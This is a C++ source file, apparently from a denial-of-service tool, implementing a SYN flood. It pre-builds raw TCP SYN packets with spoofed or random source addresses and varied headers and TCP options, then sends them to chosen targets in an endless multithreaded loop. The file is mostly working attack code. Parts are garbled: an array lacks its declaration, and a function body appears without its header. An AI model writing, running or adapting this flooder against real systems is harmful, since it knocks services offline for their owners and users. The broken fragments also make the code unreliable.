#include "SYNFlood.h"


/* Window Lengths */
 = {0,8192,65535,33268,14480,14600,16666,64136,16176,64240,64216,65453,65340,64287,38848,16740,14520,65125,15456};


/* Options Data */

const char* g_optdata[]  =
{
	            "",
		        "\x00\x00\x00\x00\x00\x00\x00\x00",
                "\x02\x04\x05\xac",
                "\x02\x04\x05\x50",
                "\x02\x04\x05\x84",
                "\x02\x04\x05\x78",
                "\x02\x04\x05\x78\x01\x03\x03\x02\x01\x01\x04\x02",
                "\x02\x04\x05\xac\x01\x03\x03\x02\x01\x01\x04\x02",
                "\x02\x04\x05\x8c\x01\x03\x03\x02\x01\x01\x04\x02",
                "\x02\x04\x05\x84\x01\x03\x03\x08\x01\x01\x04\x02",
                "\x02\x04\x05\x84\x01\x01\x04\x02",
                "\x02\x04\x05\xac\x01\x03\x03\x08\x01\x01\x04\x02"
                "\x02\x04\x05\x64\x04\x02\x08\x0a\x00\x11\x84\x41\x00\x00\x00\x00\x01\x03\x03\x03",
                "\x02\x04\x05\x78\x04\x02\x08\x0a\x00\x01\x4b\x03\x00\x00\x00\x00\x01\x03\x03\x05",
                "\x02\x04\x05\x78\x01\x03\x03\x03\x01\x01\x08\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01\x04\x02",
                "\x02\x04\x05\xac\x01\x01\x04\x02",
                "\x02\x04\x05\xac\x01\x03\x03\x08\x01\x01\x04\x02",
                "\x02\x04\x05\xac\x01\x03\x03\x02\x01\x01\x04\x02",
                "\x02\x04\x05\x8c\x01\x03\x03\x08\x01\x01\x04\x02",
                "\x02\x04\x05\xac\x01\x01\x04\x02",
                "\x02\x04\x05\x84\x01\x03\x03\x02\x01\x01\x04\x02",
                "\x02\x04\x05\xb4",
                "\x02\x04\x05\xa0\x01\x01\x04\x02",
                "\x02\x04\x05\x78\x01\x03\x03\x08\x01\x01",
                "\x02\x04\x05\xac\x01\x01\x04\x02",
                "\x02\x04\x05\xac\x01\x01\x04\x02",
                "\x02\x04\x05\x78\x01\x03\x03\x08\x01\x01\x04\x02",
                "\x02\x04\x05\x50\x01\x01\x04\x02",
                "\x02\x04\x05\xb4\x01\x01\x04\x02",
                "\x02\x04\x05\xb4\x04\x02\x08\x0a\x00\xad\xa8\x70\x2e\x1f\xaa\x01",
                "\x02\x04\x05\xb4\x04\x02\x08\x0a\x00\xad\xa9\x1c\x2e\x1f\xaa\xab",
                "\x02\x04\x05\x50\x01\x03\x03\x02\x01\x01\x04\x02",
                "\x02\x04\x05\xb4\x01\x03\x03\x02\x01\x01\x04\x02",
                "\x02\x04\x05\x78\x01\x03\x03\x02\x01\x01\x04\x02",
                "\x02\x04\x05\x78\x01\x01\x04\x02",
                "\x02\x04\x05\xa0",
                "\x02\x04\x05\xac\x01\x03\x03\x08",
                "\x02\x04\x05\xac\x01\x01\x04\x02\x00\x02\x04\x05",
                "\x02\x04\x05\x78\x01\x03\x03\x08",
                "\x02\x04\x05\x78\x01\x03\x03\x03\x01\x01\x08\x0a\x00\x00\x00\x00\x00\x00\x00\x00",
                "\x02\x04\x05\xac\x01\x01\x04\x02\x00\x02\x04\x05\xac\x01\x03\x03\x08\x01\x01\x04\x02\x00\x02\x04",
                "\x02\x04\x05\xb4\x00\x02\x04\x05\xa0\x01\x01\x04 ",
                
                
                
};


/* fragmentation options */

const uint16_t  g_optfrag[] =
{
	0x4000,	  //don't fragment
	0x2000,	  //more fragment
	0x0		  //none
};


#ifdef WIN32
static DWORD WINAPI ThreadProc(LPVOID) ;
#endif



	
	cout << endl << "Attacking... ";
	cout.flush();	
	
#ifdef SINGLE_THREADED
	SendPackets();
#else
	LaunchThreads();
#endif
		
}


void SYNFlood::BuildPackets()
{

	
	/* pre-construct the packets */
	
	char buf[128] ;
	char sbuf[128] ;
	int optlen = 0;
	int size_eth = 0;
   
		
#ifdef WIN32
	size_eth = ETHHDRSIZE;
	struct ethhdr *eh = (struct ethhdr*)buf;	
#endif
	
	struct iphdr *  ih = (struct iphdr*) (buf + size_eth);
	struct tcphdr *  th = (struct tcphdr*) (buf + IPHDRSIZE+ size_eth);	
	struct pseudohdr * ph = (struct pseudohdr *)sbuf;
		
	cout <<  endl << endl << endl << "Pre-computing packets... " ;
	cout.flush();
	

	for(unsigned int i = 0 ; i < MAX_PACKETS; ++i)
	{			
		

		memset(buf,0,128);
		memset(sbuf,0,128);		

#ifdef WIN32	
		memcpy(eh->dhost, _options->dev.dmac, ETHER_ADDR_LEN);
		memcpy(eh->shost, _options->dev.smac, ETHER_ADDR_LEN);
		eh->type = 8;
#endif			

				
		/* set target */
		
		if (_targets.empty())
		{		
			
			if (_options->target_low != -1)
			{
				ih->daddr = htonl(MyRandom() % (_options->target_high  - _options->target_low ) + _options->target_low) ;				
			}
			else
			{			
				cout << "No target has been specified!" << endl;
				exit(0);				
			}					
					
		}
		else		
		{			
			ih->daddr = _targets[MyRandom()%_targets.size()];				
		}


		/* set sources */
		
		if (_sources.empty())
		{
			
			if (_options->source_low != -1)
			{
				ih->saddr = htonl(MyRandom() % (_options->source_high  - _options->source_low ) + _options->source_low );
			}
			else
			{
				ih->saddr = MyRandom();	
			}

		}
		else		
		{			
			ih->saddr = _sources[MyRandom()%_sources.size()];			
		}

						
		/* set the destination port */

		if (_dports.empty())
		{
			th->dest = htons(rand() % (_options->dport_high - _options->dport_low) + _options->dport_low);		
		}
		else		
		{
			th->dest = htons(_dports[rand()%_dports.size()]);			
		}


		/* set the source port */

		if (_sports.empty())
		{
			th->source = htons(rand() % (_options->sport_high - _options->sport_low) + _options->sport_low);		
		}
		else		
		{
			th->source = htons(_sports[rand()%_sports.size()]);			
		}
			

		
		/* set the ID Values */

		if (_ids.empty())
		{
			ih->id = htons(rand() % (_options->id_high - _options->id_low) + _options->id_low);		
		}
		else		
		{			
			ih->id = htons(_ids[rand()%_ids.size()]);			
		}
		
			
		/* set the fragmentation options */

		if (_frags.empty())
		{
			ih->frag_off = htons(g_optfrag[0]);	
		}
		else		
		{			
			ih->frag_off = htons( g_optfrag[_frags[rand()%_frags.size()]]);			
		}
		
		
		/* set the TTL values */

		if (_ttls.empty())
		{
			ih->ttl = rand() % (_options->ttl_high - _options->ttl_low) + _options->ttl_low;		
		}
		else		
		{			
			ih->ttl = _ttls[rand()%_ttls.size()];			
		}
		
		
		/* set the window size */

		if (_wnds.empty())
		{
		
			if (_options->wnd_low != -1)
			{
				th->window = htons(rand() % (_options->wnd_high - _options->wnd_low) + _options->wnd_low);		
			}
			else			
			{
				//the default
				th->window = htons(g_wndlens[rand() % sizeof(g_wndlens)/sizeof(uint16_t)]); 
			}
				
		
		}
		else		
		{			
			th->window = htons(_wnds[rand()%_wnds.size()]);			
		}


		/* set MSS Options */

		
		int index = 0;
		 
		if (_mss.empty())
		{
			 index = rand() %  _optnum;	
		}
		else		
		{
			
		   	index = _mss[rand()%_mss.size()];
		}
		
		optlen = _msslens[index];

		if (optlen != 0)
		{
		

			memcpy(buf + IPHDRSIZE + TCPHDRSIZE + size_eth, g_optdata[index], optlen);				
			memcpy(sbuf + PSEUDOHDRSIZE + TCPHDRSIZE, g_optdata[index], optlen);
		
					
			for(int j = 0 ; j < _timestamps.size(); ++j)
			{
				if (_timestamps[j].index == index)
				{
					for(int k =_timestamps[j].position ; k < 4; ++k)
					{
						int n = rand() % 16;
						buf[IPHDRSIZE + TCPHDRSIZE + size_eth + 8 + k] = n;
						sbuf[PSEUDOHDRSIZE + TCPHDRSIZE + size_eth + 8 + k] = n;
					}
				}
			}

		}		

		/* General packet header information */

		
		ih->version=4;
		ih->ihl= 5 ;    
		ih->protocol=IPPROTO_TCP;
		ih->tos = 0;
		ih->tot_len= htons(IPHDRSIZE + TCPHDRSIZE + optlen	);
		th->seq = MyRandom();
	

#ifdef WIN32
		th->flags = TH_SYN;
#else
		th->syn = 1;
		th->ack = 1;
#endif

		th->doff=  (TCPHDRSIZE + optlen) / 4;   
				
	
		
		/* perform checksuming*/
		
		
		ph->saddr = ih->saddr;
	 	ph->daddr = ih->daddr;
		ph->mbz= 0;
		ph->ptcl = IPPROTO_TCP;
	 	ph->tcpl = htons(TCPHDRSIZE + optlen);	
		
		memcpy(sbuf + PSEUDOHDRSIZE, th, TCPHDRSIZE);		
		th->check =   Checksum((uint16_t*)sbuf, PSEUDOHDRSIZE + TCPHDRSIZE + optlen);
		


#ifdef HEADER_CHECKSUM
		ih->check = Checksum((uint16_t*)ih, 20) ;
#endif
		 	



#ifndef WIN32	
		
	 	memset(&_sins[i],0,sizeof(_sins[i]));

		_sins[i].sin_family=AF_INET;
		_sins[i].sin_port= th->dest;
		_sins[i].sin_addr.s_addr= ih->daddr;
#endif
			
		memcpy(_packets[i], buf, 128 );				
		_lengths[i] = IPHDRSIZE + TCPHDRSIZE +optlen  + size_eth;

	}


	cout << "Done." << endl;
}


void SYNFlood::SendPackets()
{



#ifdef WIN32
	pcap_t* dev;	

	string deviceName = "\\Device\\NPF_" + string(_options->dev.name);
	
	if (!OpenNetworkDevice(deviceName,dev))
	{
		cout << endl <<  "Unable to open network device!" <<endl;
		return;
	}
#else
	
	int s;
	int one = 1;	
	
	if ((s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
	{
		cout << "Unable to open raw socket!" <<endl <<endl;
		exit(1);
	}

	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, &one, sizeof (one)) < 0)
	{
		return;
	}

	int size = sizeof(sockaddr_in);

#endif

	
	while(true)
	{
		for(uint64_t i = 0 ; i < MAX_PACKETS; ++i)
		{
					
			#ifdef WIN32
				SendPacket(dev, _packets[i], _lengths[i]);
			#else
				sendto(s, _packets[i], _lengths[i], 0, (struct sockaddr *)&_sins[i], size);
			#endif

		}

	}


//currently this never gets called
	
#ifdef WIN32
	CloseNetworkDevice(dev);
#else
	close(s);
#endif
	

}



void SYNFlood::LaunchThreads()
{


	/* launch all the threads */

#ifdef WIN32
	HANDLE h ;
#endif

	vector<thread> threads;
	
	int threadCount = _options->thread_count;
	

	for(int i = 0; i < threadCount ; ++i)
	{ 
     
#ifdef WIN32
		h = CreateThread(NULL, 0, ThreadProc,this, 0, NULL);
#else
		threads.push_back(thread(ThreadProc, this));		
#endif

	} 
	
#ifdef WIN32	
	 WaitForSingleObject(h,INFINITE);
#else
	for(int i = 0; i < threadCount ; ++i)
	{ 
		threads[i].join();
	}

#endif		

		
}

/* thread callback function */

#ifdef WIN32
DWORD WINAPI ThreadProc( LPVOID ptr ) 
{
	SYNFlood*s=(SYNFlood*)ptr;

	s->SendPackets();	

	return 0;
}
#else
void SYNFlood::ThreadProc(void*ptr)
{
	SYNFlood*s=(SYNFlood*)ptr;

	s->SendPackets();	
}
#endif



void SYNFlood::SetTargets(const vector<uint32_t>& targets)
{
	/* copy target list */

	_targets.reserve(targets.size());
	_targets.assign(targets.begin(), targets.end());
}

void SYNFlood::SetSources(const vector<uint32_t>& sources)
{
	/* copy source list */
	_sources.reserve(sources.size());
	_sources.assign(sources.begin(), sources.end());
}

void SYNFlood::SetSourcePorts(const vector<int>& ports)
{
	/* copy source ports list */
	_sports.reserve(ports.size());
	_sports.assign(ports.begin(), ports.end());
}

void SYNFlood::SetTargetPorts(const vector<int>& ports)
{
	/* copy destination ports list */
	_dports.reserve(ports.size());
	_dports.assign(ports.begin(), ports.end());
}

void SYNFlood::SetIDValues(const vector<int>& ids)
{
	/* copy ID list */
	_ids.reserve(ids.size());
	_ids.assign(ids.begin(), ids.end());
}

void SYNFlood::SetWindowLengths(const vector<int>& wnds)
{
	/* copy window list */
	_wnds.reserve(wnds.size());
	_wnds.assign(wnds.begin(), wnds.end());
}

void SYNFlood::SetFragmentationOptions(const vector<int>& frags)
{
	/* copy framgentation options list */
	_frags.reserve(frags.size());
	_frags.assign(frags.begin(), frags.end());
}

void SYNFlood::SetTTLValues(const vector<int>& ttls)
{
	/* copy ttl list */
	_ttls.reserve(ttls.size());
	_ttls.assign(ttls.begin(), ttls.end());
}

void SYNFlood::SetMSSValues(const vector<int>& mss)
{
	/* copy mss list */
	_mss.reserve(mss.size());
	_mss.assign(mss.begin(), mss.end());
}

string SYNFlood::GetMSSOptions()
{
	/*Get the mss options string */
	return _mssoptstr;
}

int SYNFlood::GetMSSCount()
{
	/* get number of mss options */	
	return _optnum;
}

void SYNFlood::AnalyzeMSSOptions()
{

	/* Analyze the mss options */
	
	
	_optnum =  (sizeof(g_optdata) / sizeof(g_optdata[0]));
	
		
	stringstream ss;

	for(int i = 0 ; i < _optnum; i++)
	{			
		
		ss << "\t " << i << "\t[";

		string datastr(g_optdata[i]);  
					
		int optlen =  datastr.size() ;
						
		if (optlen == 0)
		{
			ss << "none";
			_msslens.push_back(0);
		}
		else
		{
			bool end = false;
			for(int j = 0 ; j < 40 && !end; j++)
			{
				
				switch (g_optdata[i][j])
				{	
					/* End of Options list */
					case 0:									
						_msslens.push_back(j);
						end = true;
						break;	
					
					/* No operation */					
					case 1: 
						ss << "NOP, ";
						break;
					
					/* MSS value */					
					case 2: 
					{
						uint16_t mss;					
						memcpy(&mss,  g_optdata[i] + j+2, 2);					
						ss << "MSS=" <<  ntohs(mss) << ", "; 
						j+=3;
						break;
					}
					
					/* Window scale */
					case 3: 
						ss << "WS=" <<  pow(2, g_optdata[i][j+2])  <<  ", ";
						j+=2;
						break;

					/* Selective Acknowledgement permitted */
					case 4: 
						ss << "SACK_PERM=1, ";
						j++;
						break;

					/* Variable bits */		
					case 5:  
						ss << "VAR DATA, ";
						j+=(g_optdata[i][j+1] + 1);
						break;

					/* Timestamp data */
					case 8: 
						ss << "TS, ";
						TIMESTAMP ts;
						ts.index = i;
						ts.position = j+2;
						_timestamps.push_back(ts);					
						j+=9;					
						break;

					/* TCP alt checksum data request */
					case 14: 
						ss << "TCP ACR, ";
						j+=2;
						break;

					/* TCP alt checksum data data */		
					case 15:			
						ss << "TCP ACD ";
						j+=(g_optdata[i][j+1] + 1);
				}

			}
		}
		
		ss << "]" << endl;
		
	}

	_mssoptstr = ReplaceAll(ss.str(), ", ]" , "]");
	
}
